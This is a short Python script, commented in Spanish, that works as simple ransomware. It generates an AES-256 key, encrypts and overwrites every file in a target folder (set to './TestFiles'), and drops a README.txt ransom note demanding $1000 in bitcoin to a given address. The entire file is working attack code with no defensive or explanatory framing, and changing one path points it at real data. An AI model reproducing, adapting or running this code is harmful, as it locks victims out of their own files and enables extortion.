from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import os

def generate_key():
    key = os.urandom(32)  # Genera una clave aleatoria de 32 bytes (256 bits)
    with open('key.key', 'wb') as key_file:
        key_file.write(key)

def load():
    return open('key.key', 'rb').read()

def encrypt(files, key):
    for file in files:
        cipher = AES.new(key, AES.MODE_CBC)  # Usar modo CBC
        iv = cipher.iv  # Obtener el IV generado

        with open(file, 'rb') as f:
            data = f.read()
        
        encrypted_data = iv + cipher.encrypt(pad(data, AES.block_size))  # Cifrar y añadir padding

        with open(file, 'wb') as f:
            f.write(encrypted_data)  # Sobrescribir el archivo con datos cifrados

if __name__ == '__main__':
    # Generar clave solo si no existe
    if not os.path.exists('key.key'):
        generate_key()
    
    key = load()
    path_to_encrypt = './TestFiles'  # Cambia esto a la ruta deseada
    files = os.listdir(path_to_encrypt)
    full_path = [os.path.join(path_to_encrypt, file) for file in files]

    # Encriptar archivos
    encrypt(full_path, key)

    # Crear un archivo README
    with open(os.path.join(path_to_encrypt, 'README.txt'), 'w') as f:
        f.write('Your files have been encrypted')
        f.write('\nIf you want to decrypt your files you will need to pay $1000 to the following bitcoin address: 1J9yZa3XazbXbJ6vW8ZL4g5B2Zc3yv7b3A')
